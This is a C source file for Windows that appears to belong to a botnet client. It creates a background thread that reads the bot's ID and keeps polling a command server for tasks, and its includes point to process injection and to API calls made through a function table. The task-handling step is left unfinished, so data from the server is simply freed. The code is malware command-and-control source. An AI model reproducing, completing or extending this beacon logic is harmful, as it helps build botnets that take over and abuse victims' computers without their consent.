#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#include "bot.h"
#include "connection.h"

#include "functions_table.h"

#include "process_injections.h"

#include "global_config.h"
#include "debug.h"

#include <stdlib.h>

//
HANDLE t_init_bot_auto_get_task_thread = NULL;
DWORD t_init_bot_auto_get_task_id = 0;

//
static DWORD WINAPI bot_auto_get_task_thread(LPVOID null_param)
{
	//
	char bot_id[20];
	bool ret = bot_get_bot_id(bot_id);
	if (!ret) return -1;

	//
	while (1) {
		l_Sleep(BOT_AUTO_GET_TASK_INTERVAL);

		DBG_MSG("bot_auto_get_task_thread: new iteration comes\n");

		//
		char* data_from_server = NULL;
		int data_from_server_len = 0;

		//
		bool command_ret = COMMAND_TYPE_2(COMMAND_TYPE_2_BOT_GET_TASK, (char*)bot_id, BOT_ID_LEN, data_from_server, &data_from_server_len);

		if (!command_ret) {
			DBG_MSG("bot_auto_get_task_thread: Failed to send to server. continue now.\n");
			continue;
		}

		if (data_from_server == NULL) {
			DBG_MSG("bot_auto_get_task_thread: No data received from server for this command. continue now.\n");
			continue;
		}
		else {
			// TODO: for now, do nothing.
			DBG_MSG("bot_auto_get_task_thread: TODO: for now, free() data from server.\n");
			free(data_from_server);
		}


	}


	return 0;
}


//
bool manager_init_bot_auto_get_task_thread()
{
	//
	t_init_bot_auto_get_task_thread = l_CreateThread(
		NULL,
		0,
		bot_auto_get_task_thread,
		NULL,
		0,
		&t_init_bot_auto_get_task_id
	);

	if (t_init_bot_auto_get_task_thread == NULL) {
		DBG_MSG(" manager_init_bot_auto_get_task_thread() - l_CreateThread() failed, error code: %d\n", l_GetLastError());

		return false;
	}

	//
	DBG_MSG("manager_init_bot_auto_get_task_thread() - SUCCESS.\n");

	//

	return true;
}